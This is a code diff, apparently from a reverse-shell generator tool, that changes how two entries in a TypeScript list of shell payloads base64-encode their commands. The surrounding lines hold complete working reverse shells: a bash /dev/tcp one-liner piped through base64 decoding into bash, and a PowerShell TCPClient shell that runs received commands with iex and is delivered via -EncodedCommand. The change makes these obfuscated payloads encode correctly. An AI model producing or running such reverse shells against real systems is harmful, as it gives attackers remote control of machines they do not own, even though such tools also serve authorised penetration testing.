@@ -57,7 +57,8 @@ export const SHELLS: ShellEntry[] = [
         linux: true,
         cmd: (l, p) => {
             const inner = `bash -i >& /dev/tcp/${l}/${p} 0>&1`;
-            const b64 = btoa(inner);
+            const bytes = new TextEncoder().encode(inner);
+            const b64 = btoa(Array.from(bytes, b => String.fromCharCode(b)).join(''));
             return `echo ${b64} | base64 -d | bash`;
         },
     },
@@ -159,14 +160,15 @@ export const SHELLS: ShellEntry[] = [
         windows: true,
         cmd: (l, p) => {
             const inner = `$client = New-Object System.Net.Sockets.TCPClient('${l}',${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
-            // UTF-16LE base64 (how PowerShell -EncodedCommand expects it)
-            let b64 = '';
-            try {
-                const utf16 = Array.from(inner).map(c => String.fromCharCode(c.charCodeAt(0), 0)).join('');
-                b64 = btoa(utf16);
-            } catch {
-                b64 = btoa(inner);
+
+            const bytes = new Uint8Array(inner.length * 2);
+            for (let i = 0; i < inner.length; i++) {
+                const code = inner.charCodeAt(i);
+                bytes[i * 2] = code & 0xff;
+                bytes[i * 2 + 1] = code >> 8;
             }
+            const b64 = btoa(Array.from(bytes, b => String.fromCharCode(b)).join(''));
+
             return `powershell -EncodedCommand ${b64}`;
         },
     },
